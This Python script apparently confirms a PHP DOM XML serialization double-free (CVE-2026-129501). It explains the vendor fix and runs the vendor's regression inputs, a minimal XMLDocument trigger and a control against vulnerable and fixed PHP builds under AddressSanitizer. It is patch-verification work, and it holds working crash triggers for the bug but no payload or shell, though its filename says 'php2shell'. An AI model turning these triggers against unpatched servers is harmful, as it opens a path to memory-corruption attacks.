#!/usr/bin/env python3
"""CVE-2026-129501 / GHSA-x8r7-mg3g-74hg: double free during DOM XML serialization.

Runs the vendor's own regression case (php-8.5.13
ext/dom/tests/modern/xml/GHSA-x8r7-mg3g-74hg.phpt) plus a minimal
XMLDocument-only variant against an affected and a fixed dom-enabled PHP CLI.

The 8.5.12 -> 8.5.13 ext/dom/xml_serializer.c diff has two hunks:
  1. dom_xml_ns_prefix_map_add(): a refcount>1 candidates list is duplicated
     with zend_array_dup(); without the fix the duplicated zvals keep the
     DOM_Z_OWNED flag, so both the original and the copy efree() the same
     prefix at map destruction -> double free.
  2. dom_xml_serializing_a_document_node(): the old code set node->children
     to NULL around xmlSaveDoc() and restored it after; a TRY bailout mid-save
     (a stream wrapper can reach the real document) left the real document
     mutated. The fix saves a shallow declaration_doc copy instead.

Usage: python3 php2shell-cve129501-dom.py VULN_BIN FIXED_BIN [OUTDIR]
No network: local CLI processes only. Runs with USE_ZEND_ALLOC=0 so emalloc
goes to libc malloc and ASan observes the double free; leak detection off.
"""
import os
import pathlib
import subprocess
import sys

# Verbatim --FILE-- body of the vendor regression test, minus the trailing ?>
VENDOR = r'''<?php
$doc = Dom\HTMLDocument::createFromString('<!DOCTYPE html><svg xmlns:xlink="urn:x" xlink:href="a"><g xmlns:xlink="http://www.w3.org/1999/xlink"/></svg><svg/>', LIBXML_NOERROR);
echo $doc->saveXml(), "\n";

$doc = Dom\XMLDocument::createFromString('<cat><kitten xmlns:cat="meow"/></cat>');
$doc->documentElement->setAttributeNS('meow', 'miau', 'miaou');
echo $doc->saveXml(), "\n";
'''

# Minimal XMLDocument-only shape: the second vendor case, which exercises the
# namespace-prefix-map duplication path without the HTML5/lexbor parser.
XML_ONLY = r'''<?php
$doc = Dom\XMLDocument::createFromString('<cat><kitten xmlns:cat="meow"/></cat>');
$doc->documentElement->setAttributeNS('meow', 'miau', 'miaou');
echo $doc->saveXml(), "\n";
'''

# Control: single namespace, no prefix-list duplication.
CONTROL = r'''<?php
$doc = Dom\XMLDocument::createFromString('<cat><kitten/></cat>');
echo $doc->saveXml(), "\n";
'''

CASES = [('vendor', VENDOR), ('xml_only', XML_ONLY), ('control', CONTROL)]

ASAN_MARK = 'AddressSanitizer'
DF_MARK = 'double-free'


def run(bin_path, script, out):
    env = os.environ.copy()
    env['USE_ZEND_ALLOC'] = '0'
    env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=0'
    cp = subprocess.run([str(bin_path), '-n', str(script)],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        timeout=120, env=env)
    text = cp.stdout.decode(errors='replace')
    out.write_text(text)
    return cp.returncode, text


def classify(rc, text):
    asan = ASAN_MARK in text
    df = DF_MARK in text
    crash = rc != 0
    if asan and df:
        return 'ASAN_DOUBLE_FREE'
    if asan:
        return 'ASAN_OTHER'
    if crash:
        return 'CRASH_NO_ASAN'
    return 'CLEAN'


def main():
    if len(sys.argv) < 3:
        print(__doc__)
        return 2
    vuln = pathlib.Path(sys.argv[1]).resolve()
    fixed = pathlib.Path(sys.argv[2]).resolve()
    outdir = pathlib.Path(sys.argv[3]).resolve() if len(sys.argv) > 3 else \
        pathlib.Path(__file__).resolve().parent.parent / 'build' / 'evidence' / 'w51-129501-dom'
    outdir.mkdir(parents=True, exist_ok=True)

    results = {}
    for name, body in CASES:
        script = outdir / (name + '.php')
        script.write_text(body)
        vrc, vtext = run(vuln, script, outdir / (name + '.vulnerable.log'))
        frc, ftext = run(fixed, script, outdir / (name + '.fixed.log'))
        vc, fc = classify(vrc, vtext), classify(frc, ftext)
        results[name] = (vc, fc, vrc, frc)
        print(f'{name:10s} vuln rc={vrc:4d} {vc:16s} | fixed rc={frc:4d} {fc:16s}')

    # CONFIRMED: at least one trigger case double-frees on the affected build
    # while the fixed build is clean, and the control is clean on both.
    triggers = [n for n in ('vendor', 'xml_only')]
    confirmed = any(results[n][0] == 'ASAN_DOUBLE_FREE' for n in triggers) and \
        all(results[n][1] == 'CLEAN' for n in triggers) and \
        results['control'] == ('CLEAN', 'CLEAN', 0, 0)
    verdict = 'CONFIRMED' if confirmed else 'NOT CONFIRMED'
    print(f'verdict: {verdict}')
    lines = [f'verdict: {verdict}',
             f'vulnerable={vuln}', f'fixed={fixed}']
    for name, (vc, fc, vrc, frc) in results.items():
        lines.append(f'{name}: vuln rc={vrc} {vc}; fixed rc={frc} {fc}')
    (outdir / 'verdict.txt').write_text('\n'.join(lines) + '\n')
    return 0 if confirmed else 1


if __name__ == '__main__':
    sys.exit(main())
